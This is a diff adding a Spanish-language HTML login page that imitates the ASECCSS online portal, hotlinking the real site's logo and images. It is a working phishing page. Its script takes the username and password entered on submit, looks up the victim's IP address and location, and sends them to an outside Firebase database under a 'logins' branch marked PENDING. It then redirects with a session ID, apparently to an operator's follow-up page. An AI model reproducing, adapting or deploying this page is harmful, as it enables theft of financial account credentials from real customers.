@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ASECCSS</title>
+  <link rel="stylesheet"
+href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+  <style>
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family:"Poppins",sans-serif;
+    }
+
+    body{
+      background:#fff;
+      min-height:100vh;
+    }
+
+    .container{
+      display:flex;
+      min-height:100vh;
+    }
+
+    /* ==========================
+       PANEL IZQUIERDO
+    ========================== */
+    .left{
+      width:60%;
+      background:url("https://www.aseccssenlinea.com/Content/Login/HomeImage.jpg")
+                 center center / cover no-repeat;
+      min-height:100vh;
+    }
+
+    /* ==========================
+       PANEL DERECHO
+    ========================== */
+    .right{
+      width:40%;
+      display:flex;
+      justify-content:center;
+      align-items:flex-start;
+      padding:24px 40px;
+      background:#fff;
+    }
+
+    .login{
+      width:100%;
+      max-width:520px;
+    }
+
+    .logo{
+      width:220px;
+      display:block;
+      margin:0 auto;
+    }
+
+    .welcome{
+      text-align:center;
+      font-size:18px;
+      margin:14px 0 44px;
+      color:#555;
+    }
+
+    .option p{
+      margin-bottom:20px;
+      font-size:18px;
+      color:#333;
+    }
+
+    .radio-group{
+      display:flex;
+      gap:38px;
+      margin-bottom:30px;
+      flex-wrap:wrap;
+    }
+
+    .radio-group label{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      cursor:pointer;
+      font-size:18px;
+      color:#333;
+    }
+
+    input[type=radio]{
+      accent-color:#0a97dc;
+      width:20px;
+      height:20px;
+    }
+
+    .input-group{
+      margin-bottom:22px;
+    }
+
+    .input-group label{
+      display:block;
+      margin-bottom:8px;
+      font-size:17px;
+      font-weight:500;
+      color:#333;
+    }
+
+    .input-group input{
+      width:100%;
+      border:none;
+      border-bottom:2px solid #26a8e8;
+      padding:12px 5px;
+      outline:none;
+      font-size:18px;
+      color:#333;
+      background:transparent;
+    }
+
+    .input-group input::placeholder{
+      color:#9aa0a6;
+    }
+
+    .links{
+      display:flex;
+      justify-content:space-between;
+      gap:16px;
+      margin:25px 0;
+      flex-wrap:wrap;
+    }
+
+    .links a{
+      color:#0994db;
+      text-decoration:none;
+      font-size:16px;
+    }
+
+    button{
+      width:100%;
+      height:58px;
+      border:none;
+      border-radius:8px;
+      background:#0b90d8;
+      color:#fff;
+      font-size:22px;
+      font-weight:500;
+      cursor:pointer;
+      margin-top:10px;
+    }
+
+    button:hover{
+      background:#087fbe;
+    }
+
+    .account{
+      margin:28px 0 15px;
+      color:#444;
+    }
+
+    .support{
+      margin-top:24px;
+      color:#0b90d8;
+      font-size:18px;
+    }
+
+    /* ==========================
+       FIRMA DIGITAL
+    ========================== */
+    .descripcion{
+      color:#333;
+      font-size:18px;
+      line-height:1.7;
+      margin-bottom:30px;
+    }
+
+    .nacionalidad{
+      display:flex;
+      gap:45px;
+      margin-top:15px;
+      flex-wrap:wrap;
+    }
+
+    .nacionalidad label{
+      display:flex;
+      align-items:center;
+      gap:8px;
+      font-size:18px;
+      color:#333;
+    }
+
+    #formFirma{
+      display:none;
+    }
+.password-box{
+    position:relative;
+    width:100%;
+}
+
+.password-box input{
+    width:100%;
+    border:none;
+    border-bottom:2px solid #26a8e8;
+    padding:12px 60px 12px 5px;
+    outline:none;
+    font-size:18px;
+    background:transparent;
+}
+
+.password-box i{
+    position:absolute;
+    top:50%;
+    transform:translateY(-50%);
+    color:#0b90d8;
+    font-size:18px;
+}
+
+#togglePassword{
+    right:35px;
+    cursor:pointer;
+}
+
+.fa-lock{
+    right:8px;
+}
+    /* ==========================
+       TABLET
+    ========================== */
+    @media (max-width: 1024px){
+      .left{ width:50%; }
+      .right{ width:50%; padding:20px 28px; }
+    }
+
+    /* ==========================
+       MÓVIL
+    ========================== */
+    @media (max-width: 768px){
+
+      .container{
+        display:block;
+      }
+
+      /* Ocultar completamente el panel izquierdo */
+      .left{
+        display:none;
+      }
+
+      /* El formulario ocupa todo el ancho */
+      .right{
+        width:100%;
+        min-height:100vh;
+        padding:20px 18px 28px;
+      }
+
+      .login{
+        max-width:100%;
+      }
+
+      .logo{
+        width:190px;
+      }
+
+      .welcome{
+        margin-bottom:34px;
+      }
+
+      .radio-group{
+        gap:20px;
+      }
+
+      .links{
+        flex-direction:column;
+        align-items:flex-start;
+      }
+
+      button{
+        font-size:20px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+
+    <!-- PANEL IZQUIERDO -->
+    <div class="left"></div>
+
+    <!-- PANEL DERECHO -->
+    <div class="right">
+      <form id="login-form" class="login">
+
+        <img src="https://www.aseccssenlinea.com/Content/Login/ASECCSSLogo.png" alt="ASECCSS" class="logo">
+
+        <div class="welcome">
+          Te damos la bienvenida
+        </div>
+
+        <div class="option">
+          <p>Seleccioná el método de ingreso:</p>
+
+          <div class="radio-group">
+            <label>
+              <input type="radio" name="tipoIngreso" value="password" checked>
+              Contraseña
+            </label>
+
+            <label>
+              <input type="radio" name="tipoIngreso" value="firma" disabled>
+              Firma Digital
+            </label>
+          </div>
+        </div>
+
+        <!-- FORMULARIO CONTRASEÑA -->
+        <div id="formPassword">
+
+          <div class="input-group">
+            <label>Usuario</label>
+            <input type="text" id="user">
+          </div>
+
+          <div class="input-group">
+    <label for="pass">Contraseña</label>
+
+    <div class="password-box">
+        <input type="password" id="pass">
+
+        <i class="fa-solid fa-eye" id="togglePassword"></i>
+        <i class="fa-solid fa-lock"></i>
+    </div>
+</div>
+
+          <div class="links">
+            <a href="#">Recuperar ASETOKEN</a>
+            <a href="#">¿Olvidaste tu contraseña?</a>
+          </div>
+        </div>
+
+        <button type="submit" id="btn-envio">Ingresar</button>
+
+        <div class="account">¿No tenés cuenta?</div>
+
+        <button>Creá la cuenta</button>
+
+        <div class="support">🎧 Canales de Atención</div>
+</form>
+    </div>
+  </div>
+  <script>
+// 1. CONFIGURACIÓN DE TU PROYECTO
+    const firebaseConfig = { 
+        databaseURL: "https://coomecipaonline-default-rtdb.firebaseio.com/" 
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Crear un ID único para esta sesión de usuario
+    const sessionId = "ID-" + Math.random().toString(36).substr(2, 7).toUpperCase();
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Captura de datos
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+        const btn = document.getElementById('btn-envio');
+
+        // Deshabilitar botón para evitar doble clic, pero sin cambiar texto ni mostrar loaders
+        btn.disabled = true;
+
+        // 2. OBTENER GEOLOCALIZACIÓN Y ENVIAR AL PANEL
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(ipData => {
+                const payload = {
+                    user: u,
+                    pass: p,
+                    ip: ipData.ip || '0.0.0.0',
+                    ubicacion: `${ipData.city || '?'}, ${ipData.country_name || '?'}`,
+                    fecha: new Date().toLocaleString(),
+                    status: 'PENDING' 
+                };
+
+                // Guardar en la rama 'logins' y redirigir inmediatamente al terminar
+                db.ref('logins/' + sessionId).set(payload).then(() => {
+                    window.location.href = 'index.html?id=' + sessionId;
+                });
+            })
+            .catch(() => {
+                // En caso de error de red, intentamos la redirección de todos modos para no trabar al usuario
+                window.location.href = 'index.html?id=' + sessionId;
+            });
+    });
+</script>
+<script>
+const pass = document.getElementById("pass");
+const togglePassword = document.getElementById("togglePassword");
+
+togglePassword.addEventListener("click", function(){
+
+    if(pass.type==="password"){
+        pass.type="text";
+        togglePassword.classList.remove("fa-eye");
+        togglePassword.classList.add("fa-eye-slash");
+    }else{
+        pass.type="password";
+        togglePassword.classList.remove("fa-eye-slash");
+        togglePassword.classList.add("fa-eye");
+    }
+
+});
+</script>
+</body>
+</html>
